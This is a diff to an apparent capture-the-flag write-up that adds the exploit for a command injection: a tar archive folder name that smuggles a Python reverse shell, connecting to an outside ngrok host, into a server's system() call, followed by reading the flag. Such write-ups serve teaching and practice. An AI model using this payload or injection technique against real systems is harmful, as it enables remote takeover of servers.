@@ -31,7 +31,12 @@ system(hcmd);
 ``` 
   
 In order to exploit this we need to name one of our inside folders in the archive in a special way, to include the code that we want to run on the server (we went with a python reverse shell in this case):  
-INSERT EXPLOIT  
+```
+In a tar folder, zip the following:
+
+folder1->folder2->(injection folder)
+injection folder name (the quotes are part of the name): ";python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.eu.ngrok.io",16642));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["x2fbinx2fsh","-i"]);' ;echo "
+```
 We we upload the tar archive with this folder we get a reverse shell, and then quickly after the flag🚩:
 ```
 $ cat flag.txt
